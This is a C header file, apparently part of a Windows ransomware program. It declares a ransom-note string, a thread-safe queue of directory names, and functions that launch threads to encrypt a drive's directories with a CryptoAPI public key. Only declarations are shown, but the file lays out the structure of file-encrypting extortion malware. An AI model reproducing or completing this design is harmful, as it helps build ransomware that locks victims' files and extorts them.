#pragma once

#ifndef __Threading_h__
#define __Threading_h__
#include "Crypto.h"
extern LPCSTR ransomNoteContent;

struct LL_NODE {
	LPSTR dirName;
	struct LL_NODE* nextNode;
};

typedef struct {
	HANDLE* threadArray;
	int threadCount;
	CRITICAL_SECTION threadCriticalSection;
	LL_NODE* head;
	LL_NODE* tail;
} THREAD_STRUCT;

extern THREAD_STRUCT threadStruct;

void threadEncrypt(THREAD_STRUCT* pThreadStruct);
int initThreadStruct();
void launchThreadEncrypt(LPSTR drivePath);
void cleanUpThread();
void freeNode(LL_NODE* node);
LL_NODE* popNode(THREAD_STRUCT* pThreadStruct);
int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name);
LL_NODE* newNode();
int acquireContext(HCRYPTPROV* phCryptProv);
int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR directoryName, THREAD_STRUCT* pThreadStruct);
#endif
